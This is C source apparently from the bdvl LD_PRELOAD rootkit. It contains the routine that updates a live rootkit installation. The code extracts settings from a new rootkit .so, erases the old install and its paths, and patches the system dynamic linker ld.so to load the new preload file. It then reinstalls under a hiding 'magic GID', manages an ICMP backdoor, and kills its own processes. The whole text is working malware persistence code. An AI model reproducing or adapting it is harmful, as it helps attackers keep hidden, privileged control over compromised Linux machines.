/* reads target sopath for the values of BDVLSO, INSTALL_DIR, OLD_PRELOAD & PRELOAD_FILE
 * & stores what it finds in an array. the result is returned.
 * NULL is returned, if either:
 *     return value of getfilesize on target sopath is 0,
 *     memory could not be allocated for the contents of sopath,
 *     memory could not be allocated for the array in which located values are stored,
 *     or target sopath could not be opened for reading. */
char **bdvsearch(const char *sopath, int *cm){
    off_t fsize, cfile;
    unsigned char *buf;
    FILE *fp;
    size_t n;
    int c=0, got, cmark, k;
    char *markname, **values;

    hook(CFOPEN);

    fsize = getfilesize(sopath);
    if(fsize == 0) return NULL;

    buf = malloc(fsize+1);
    if(!buf) return NULL;
    memset(buf, 0, fsize+1);

    values = malloc(sizeof(char*)*sizeofarr(marknames));
    if(!values){
        free(buf);
        return NULL;
    }

    fp = call(CFOPEN, sopath, "rb");
    if(fp == NULL){
        free(buf);
        free(values);
        return NULL;
    }

    do{
        n = fread(buf, 1, fsize, fp);

        for(cmark=0; cmark < sizeofarr(marknames); cmark++){
            c=0, got=0, k=0;
            markname = marknames[cmark];

            for(cfile=0; cfile < fsize && got != 1; cfile++){
                if(buf[cfile] == markname[c]){ // character match
                    if(c == strlen(markname)-1){
                        values[cmark] = malloc(PATH_MAX);
                        if(!values[cmark]){
                            free(values);
                            values=NULL;
                            goto nopenope;
                        }

                        memset(values[cmark], 0, PATH_MAX);
                        got=1; // get ready to retrieve value
                    }
                    c++;
                }else c=0;

                if(got){ // read to the end of the value. copy it.
                    cfile++; // start at the beginning of the value...
                    while(buf[cfile] != '\0')
                        memcpy(&values[cmark][k++], &buf[cfile++], 1);
                    values[cmark][k]='\0';
                }
            }
        }
    }while(n > 0);
nopenope:
    free(buf);
    fclose(fp);

    *cm = cmark;
    return values;
}

void freevals(char **vals, int c){
    for(int i=0; i<c; i++){
        free(vals[i]);
        vals[i] = NULL;
    }
    free(vals);
}

/* uninstall current installation. install target installation.
 *
 * this function is similar to bdvuninstall however there are a few minor differences.
 *   1. ld.so is not reverted, it is patched again to read from the new PRELOAD_FILE. (or OLD_PRELOAD if PATCH_DYNAMIC_LINKER is not defined in the target)
 *   2. HOMEDIR is not removed until the end if calling process (you) are in it installing bdvl.
 *   3. and of course..we reinstall with our new version at the very end.  */
void bdvupdate(char *const argv[]){
    char *aso=NULL, **values, status, *cwd;
    char *bdvlso, *installdir, *oldpreload, *preloadpath;
    char *curpreload=OLD_PRELOAD, *targetpreload;
    int cmark, inhome=0, i;

    /* first make sure there is a valid target bdvl.so in argv. */
    for(i=2; argv[i] != NULL; i++)
        strstr(argv[i], ".so.") ? aso=argv[i] : NULL;

    if(aso == NULL){
        printf("No target .so(s)\n");
        return;
    }

    /* let's go! */
    printf("\n\e[1mAbout to begin update!\e[0m\n");
    printf("  Everything from this current installation will be removed.\n");
    printf("  So make sure you've saved stuff you wanna see again.\n");
    printf("Press enter to continue, ^C to cancel.\n");
    getchar();

    /* read important settings from target bdvl.so */
    values = bdvsearch(aso, &cmark);
    if(!values){
        printf("Couldn't find settings.\n");
        return;
    }
    bdvlso     = values[0], installdir  = values[1],
    oldpreload = values[2], preloadpath = values[3];

    /* need to know if we're gonna be using preloadpath or oldpreload... */
    printf("Is PATCH_DYNAMIC_LINKER defined in this new installation? (y/n): ");
    status = getchar();
    if(status != 'y' && status != 'Y' && status != 'n' && status != 'N'){
        printf("Invalid reply...\n");
        freevals(values, cmark);
        return;
    }

    /* uninstall current bdvl */
    printf("\nRemoving previous installation...\n");
#ifdef USE_ICMP_BD
    if(pdoorup())
        killrkprocs(readgid()-1);
#endif
    eradicatedir(INSTALL_DIR);

    if((cwd = getcwd(NULL, 0)) != NULL){   // installing new bdvl from homedir?
        if(strncmp(HOMEDIR, cwd, strlen(HOMEDIR)))
            eradicatedir(HOMEDIR);
        else inhome=1;
        free(cwd);
    }else eradicatedir(HOMEDIR); // just eradicate it now i guess

    printf("Removing bdvl paths\n");
    rmbdvpaths();

    /* repatch kit's curpreload (OLD_PRELOAD/PRELOAD_FILE) to the new one... */
    status == 'y' || status == 'Y' ? targetpreload = preloadpath : oldpreload;
#ifdef PATCH_DYNAMIC_LINKER
    curpreload = PRELOAD_FILE;
#endif
    printf("Patching ld.so\n");
    ldpatch(curpreload, targetpreload);

    /* now install new bdvl. */
    bdvinstall(argv, installdir, bdvlso, targetpreload, MAGIC_GID);  // use MAGIC_GID value we have here.
    freevals(values, cmark);
    system("cat /dev/null"); // hide everything with actual new MAGIC_GID.

    // now we can eradicate...
    if(inhome) eradicatedir(HOMEDIR);
    printf("DONE! RECONNECT!!\n");

    hook(CKILL);
    call(CKILL, getppid(), SIGKILL);
    call(CKILL, getpid(), SIGKILL);
}